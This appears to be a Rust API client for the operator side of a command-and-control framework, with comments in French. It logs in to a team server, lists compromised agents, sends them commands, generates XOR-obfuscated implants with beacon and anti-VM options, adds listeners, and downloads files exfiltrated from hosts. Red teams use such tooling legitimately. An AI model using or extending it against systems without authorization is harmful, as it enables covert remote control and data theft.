use crate::models;
use crate::models::*;
use base64;
use encoding_rs;
use std::time::Duration;
pub struct ApiClient;

impl ApiClient {
    pub async fn login(server_url: &str, username: &str, password: &str) -> Result<String, String> {
        let url = format!("{}/api/login", server_url);
        let payload = LoginRequest {
            username: username.to_string(),
            password: password.to_string(),
        };

        let client = reqwest::Client::new();
        let response = client
            .post(&url)
            .json(&payload)
            .timeout(Duration::from_secs(10))
            .send()
            .await
            .map_err(|e| format!("Connection error: {}", e))?;

        let login_response: LoginResponse = response
            .json()
            .await
            .map_err(|e| format!("Parse error: {}", e))?;

        if login_response.success {
            login_response
                .token
                .ok_or_else(|| "No token received".to_string())
        } else {
            Err(login_response.message)
        }
    }

    pub async fn logout(server_url: &str, token: &str) -> Result<(), String> {
        let url = format!("{}/api/logout", server_url);
        let client = reqwest::Client::new();

        client
            .post(&url)
            .header("Authorization", format!("Bearer {}", token))
            .send()
            .await
            .map_err(|e| format!("Logout error: {}", e))?;

        Ok(())
    }

    pub async fn fetch_agents(server_url: &str, token: &str) -> Result<Vec<models::Agent>, String> {
        let url = format!("{}/api/agents", server_url);
        let client = reqwest::Client::new();

        let response = client
            .get(&url)
            .header("Authorization", format!("Bearer {}", token))
            .timeout(Duration::from_secs(5))
            .send()
            .await
            .map_err(|e| format!("Fetch agents error: {}", e))?;

        let agents: Vec<AgentDto> = response
            .json()
            .await
            .map_err(|e| format!("Parse agents error: {}", e))?;

        Ok(agents
            .into_iter()
            .map(|a| models::Agent {
                id: a.agent_id,
                hostname: a.hostname,
                username: a.username,
                process_name: a.process_name,
                ip: a.ip,
                last_seen: Some(Self::format_timestamp(a.last_seen)),
                payload_type: a.payload_type,
                listener_name: a.listener_name,
            })
            .collect())
    }

    pub async fn send_command(
        server_url: &str,
        token: &str,
        agent_id: &str,
        command: &str,
    ) -> Result<(), String> {
        let url = format!("{}/api/task", server_url);
        let payload = TaskCommand {
            agent_id: agent_id.to_string(),
            command: command.to_string(),
        };

        let client = reqwest::Client::new();
        let response = client
            .post(&url)
            .header("Authorization", format!("Bearer {}", token))
            .json(&payload)
            .timeout(Duration::from_secs(5))
            .send()
            .await
            .map_err(|e| format!("Send command error: {}", e))?;

        let api_response: ApiResponse = response
            .json()
            .await
            .map_err(|e| format!("Parse response error: {}", e))?;

        if api_response.success {
            Ok(())
        } else {
            Err(api_response.message)
        }
    }

    pub async fn generate_agent_with_config(
        server_url: &str,
        token: &str,
        config: &models::GenerateAgentDialog,
    ) -> Result<Vec<u8>, String> {
        let url = format!("{}/api/generate", server_url);
        let client = reqwest::Client::new();

        let agent_config = AgentConfig {
            host: config.host.clone(),
            port: config.port,
            uri_path: config.uri_path.clone(),
            user_agent: config.user_agent.clone(),
            xor_key: config.xor_key.clone(),
            beacon_interval: config.beacon_interval,
            anti_vm: config.anti_vm,
            headers: config.headers.clone(),
        };

        let payload = GenerateAgentRequest {
            listener_name: config.listener_name.clone(),
            payload_type: config.payload_type.clone(),
            config: agent_config,
        };

        let response = client
            .post(&url)
            .header("Authorization", format!("Bearer {}", token))
            .json(&payload)
            .timeout(Duration::from_secs(60))
            .send()
            .await
            .map_err(|e| format!("Generate agent error: {}", e))?;

        let status = response.status();

        if !status.is_success() {
            let error_msg = response
                .text()
                .await
                .unwrap_or_else(|_| "Unknown error".to_string());
            return Err(format!("Server returned error: {} - {}", status, error_msg));
        }

        let bytes = response
            .bytes()
            .await
            .map_err(|e| format!("Failed to read response: {}", e))?;

        Ok(bytes.to_vec())
    }

    pub async fn fetch_results(
        server_url: &str,
        token: &str,
        agent_id: &str,
        save_dir: &str,
    ) -> Result<Vec<models::CommandResult>, String> {
        let url = format!("{}/api/results/{}", server_url, agent_id);
        let client = reqwest::Client::new();

        let response = client
            .get(&url)
            .header("Authorization", format!("Bearer {}", token))
            .timeout(Duration::from_secs(5))
            .send()
            .await
            .map_err(|e| format!("Fetch results error: {}", e))?;

        let results: Vec<serde_json::Value> = response
            .json()
            .await
            .map_err(|e| format!("Parse results error: {}", e))?;

        let mut processed_results = Vec::new();

        for r in results {
            let raw_content = r
                .get("output")
                .or_else(|| r.get("content"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            let timestamp = r
                .get("received_at")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            let result_type = r.get("types").and_then(|v| v.as_str()).unwrap_or("text");
            let result_id = r.get("id").and_then(|v| v.as_i64());

            let is_command = result_type == "command";

            // ✅ DISTINCTION CLAIRE entre download et upload
            let is_downloadable_file = result_type == "file";
            let is_upload_confirmation = result_type == "upload_file";

            println!(
                "Frontend Debug - type: {}, downloadable: {}, upload_confirm: {}",
                result_type, is_downloadable_file, is_upload_confirmation
            );

            // 🔥 TÉLÉCHARGEMENT AUTOMATIQUE SEULEMENT POUR LES VRAIS FICHIERS (downloads)
            if is_downloadable_file {
                if let Some(id) = result_id {
                    println!("Frontend Debug - FICHIER À TÉLÉCHARGER détecté! ID: {}", id);

                    match Self::download_result_file(server_url, token, Some(id), save_dir).await {
                        Ok(path) => {
                            println!("✅ Fichier téléchargé: {}", path);
                            processed_results.push(models::CommandResult {
                                timestamp,
                                is_command,
                                content: format!("📥 File downloaded: {}", path),
                                result_id: Some(id),
                                is_file: true,
                            });
                            continue;
                        }
                        Err(e) => {
                            eprintln!("❌ Erreur téléchargement: {}", e);
                            processed_results.push(models::CommandResult {
                                timestamp,
                                is_command,
                                content: format!("❌ Download failed: {}", e),
                                result_id: Some(id),
                                is_file: true,
                            });
                            continue;
                        }
                    }
                }
            }

            let content = if is_upload_confirmation {
                println!("✅ Confirmation d'upload détectée");
                Self::decode_base64_if_needed(&raw_content)
            } else {
                Self::decode_base64_if_needed(&raw_content)
            };

            processed_results.push(models::CommandResult {
                timestamp,
                is_command,
                content,
                result_id,
                is_file: is_downloadable_file,
            });
        }

        Ok(processed_results)
    }
    fn decode_base64_if_needed(input: &str) -> String {
        use base64::{engine::general_purpose::STANDARD, Engine as _};

        match STANDARD.decode(input) {
            Ok(bytes) => {
                // Essayer UTF-8 d'abord
                match String::from_utf8(bytes.clone()) {
                    Ok(text) => {
                        println!(
                            "✅ Base64 décodé en UTF-8: {} chars -> {} chars",
                            input.len(),
                            text.len()
                        );
                        text
                    }
                    Err(_) => match encoding_rs::WINDOWS_1252.decode(&bytes) {
                        (text, _, false) => {
                            println!(
                                "✅ Base64 décodé en Windows-1252: {} chars -> {} chars",
                                input.len(),
                                text.len()
                            );
                            text.into_owned()
                        }
                        _ => {
                            let lossy_text = String::from_utf8_lossy(&bytes);
                            println!(
                                "⚠️  Base64 décodé avec perte: {} chars -> {} chars",
                                input.len(),
                                lossy_text.len()
                            );
                            lossy_text.into_owned()
                        }
                    },
                }
            }
            Err(_) => {
                println!(
                    "⚠️  Pas du Base64, gardant l'original: {} chars",
                    input.len()
                );
                input.to_string()
            }
        }
    }

    fn format_timestamp(timestamp: u64) -> String {
        use chrono::{DateTime, Utc};
        let dt = DateTime::<Utc>::from_timestamp(timestamp as i64, 0).unwrap_or_else(|| Utc::now());
        dt.format("%Y-%m-%d %H:%M:%S").to_string()
    }

    pub async fn add_listener(
        server_url: &str,
        token: &str,
        config: &GenerateListenerDialog,
    ) -> Result<String, String> {
        let url = format!("{}/api/add/listener", server_url);
        let client = reqwest::Client::new();

        let listener_config = ListenerConfig {
            listener_name: config.listener_name.clone(),
            listener_type: config.listener_type.clone(),
            listener_ip: config.listener_ip.clone(),
            listener_port: config.listener_port,
            xor_key: config.xor_key.clone(),
            user_agent: config.user_agent.clone(),
            uri_paths: config.uri_paths.clone(),
            headers: config.headers.clone(),
            tls_cert: String::new(),
            tls_key: String::new(),
            tls_cert_chain: String::new(),
        };

        let response = client
            .post(&url)
            .bearer_auth(token)
            .json(&listener_config)
            .send()
            .await
            .map_err(|e| format!("HTTP request error: {}", e))?;

        let status = response.status();

        let response_text = response
            .text()
            .await
            .map_err(|e| format!("Failed to read response: {}", e))?;

        let api_response: serde_json::Value = serde_json::from_str(&response_text)
            .map_err(|e| format!("Failed to parse API response: {}", e))?;

        if status != 200 {
            return Err(format!(
                "API error (status {}): {}",
                status,
                api_response["message"].as_str().unwrap_or("Unknown error")
            ));
        }

        Ok(api_response["message"]
            .as_str()
            .unwrap_or("Listener added successfully")
            .to_string())
    }

    pub async fn download_result_file(
        server_url: &str,
        token: &str,
        result_id: Option<i64>,
        save_dir: &str,
    ) -> Result<String, String> {
        use std::fs;
        use std::path::Path;

        // ✅ FIX 1: Extraire l'ID correctement
        let id = result_id.ok_or("No result ID provided")?;
        let url = format!("{}/api/download/{}", server_url, id);

        println!("📡 Downloading from: {}", url);

        let client = reqwest::Client::new();
        let response = client
            .get(&url)
            .bearer_auth(token)
            .timeout(Duration::from_secs(30))
            .send()
            .await
            .map_err(|e| format!("Request error: {}", e))?;

        if !response.status().is_success() {
            let status = response.status();
            let error_body = response
                .text()
                .await
                .unwrap_or_else(|_| "Unknown error".to_string());
            return Err(format!("Download failed ({}) - {}", status, error_body));
        }

        let filename = response
            .headers()
            .get(reqwest::header::CONTENT_DISPOSITION)
            .and_then(|h| h.to_str().ok())
            .and_then(|v| {
                // Chercher "filename=" dans le header
                if let Some(start) = v.find("filename=") {
                    let filename_part = &v[start + 9..];
                    // Enlever les guillemets, espaces, et tout après un point-virgule
                    let clean = filename_part
                        .trim_matches(|c| c == '"' || c == '\'' || c == ' ')
                        .split(';')
                        .next()
                        .unwrap_or("")
                        .to_string();
                    if !clean.is_empty() {
                        Some(clean)
                    } else {
                        None
                    }
                } else {
                    None
                }
            })
            .unwrap_or_else(|| format!("download_{}.bin", id));

        println!("📝 Filename: {}", filename);

        let bytes = response.bytes().await.map_err(|e| e.to_string())?;

        println!("📦 File size: {} bytes", bytes.len());

        fs::create_dir_all(save_dir).map_err(|e| format!("Failed to create directory: {}", e))?;
        let path = Path::new(save_dir).join(&filename);

        fs::write(&path, &bytes).map_err(|e| format!("Failed to write file: {}", e))?;

        println!("✅ File saved to: {}", path.display());

        Ok(path.display().to_string())
    }
}
